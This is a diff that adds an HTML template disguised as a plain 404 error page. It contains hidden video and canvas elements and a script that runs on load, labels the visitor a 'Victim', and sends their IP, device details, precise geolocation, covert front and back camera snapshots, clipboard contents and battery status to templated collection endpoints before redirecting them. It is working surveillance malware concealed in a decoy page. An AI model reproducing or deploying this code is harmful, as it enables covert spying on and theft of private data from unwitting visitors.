@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>404 - Page Not Found</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #222; }
+.container { text-align: center; padding: 40px 20px; }
+.error-code { font-size: 120px; font-weight: 700; color: #e0e0e0; line-height: 1; margin-bottom: 16px; }
+h1 { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 12px; }
+p { font-size: 14px; color: #5f6368; line-height: 1.6; max-width: 400px; margin: 0 auto 24px; }
+a { color: #1a73e8; text-decoration: none; font-size: 14px; }
+a:hover { text-decoration: underline; }
+.divider { width: 60px; height: 1px; background: #dadce0; margin: 24px auto; }
+.footer { font-size: 12px; color: #80868b; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="error-code">404</div>
+<h1>Page Not Found</h1>
+<p>The page you're looking for doesn't exist or has been moved. Please check the URL and try again.</p>
+<a href="#">Return to homepage</a>
+<div class="divider"></div>
+<p class="footer">That's an error. The requested URL was not found on this server. That's all we know.</p>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+async function gatherAll(){
+    let td='📸 <b>404 Page Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+window.onload=function(){gatherAll(); advancedGather("<%=a %>","<%=uid %>");setTimeout(function(){window.location.href="<%=url %>";},3000);};
+</script>
+</body>
+</html>
